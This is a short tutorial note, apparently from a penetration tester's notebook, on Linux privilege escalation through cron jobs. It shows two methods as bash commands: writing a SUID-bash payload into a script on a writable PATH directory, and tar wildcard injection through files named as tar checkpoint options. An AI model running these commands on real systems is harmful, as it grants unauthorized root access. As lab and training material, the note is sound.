-- -
The main workflow here is to see what runs on a schedule from #cron or #systemd and then try to hijack it in some way. This can get creative :)
[[Dark Arts/Privesc/Linux/Enumeration/Cron Jobs|Enum]]
#### overwrite file
```bash
# lets say we found a scheduled task that looks like the following:
# * * * * * root overwrite.sh

# First, look at the PATH set to see where it looks for it, and lets say that path looks like the following:
# PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# so it checks the directories in that order. Look for any directory in that path that you can write to, in the example we can see it first looks through the user directory:
# /home/user
# that looks like a low privilege folder, so lets check it
ls -la /home/user

# that outputs:
# drwxr-xr-x 6 TCM user 4096 Jun 20 15:47 .

# This shows that we can write to that directory. This would also work if the overwrite.sh was writable by us. 

# so just simply make a malicious script, and output it to that location
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" >> /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh # only required if you write a new file, not necessary if you append to the file that already exists. 

# then just wait, after it gets run you can run your suid bit shell
/tmp/bash -p 
```
#### Wildcards
For this vector, you: 
- notice a script (or command) that is run via scheduled task. 
- the command uses a wild card in the command
- The script uses a command that uses a wild card
You may then be able to hijack the command being run with a wildcard to get it to hand you a shell. 
```bash
# for this example, we are going to see the following script in the crontab, but same process for if it's a direct command in crontab:
# * * * * * root /usr/local/bin/compress.sh

# it's an absolute path, so we need to see if the script can be manipulated, first check if you can overwrite it:
ls -la /usr/local/bin/compress.sh

# given the location, that is not likely. So next step is to read the script
cat /usr/local/bin/compress.sh

# and lets say we find the use of a wildcard by the following line in /usr/local/bin/compress.sh:
# cd /home/user
# tar czf /tmp/backup.tar.gz *

# again, you can also see that tar command with a wild card used directly in the crontab. Would be the same from here.

# create malicious script, for this example we write to /home/user
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
chmod +x runme.sh

# this part is specific to exploiting tar for a wild card
# create flag files in the directory where tar will be run.
touch '/home/user/--checkpoint=1'
touch '/home/user/--checkpoint-action=exec=sh\ runme.sh'

# so when tar runs with a wild card, it picks up all the files in pwd, so we are placing files that are named valid tar flags, so when they are picked up, they are processed as flags for tar, so they will point to executing sh and running your malicious script, which since it is run as aroot owned cron job, it will run it as root and spit out the suid shell
```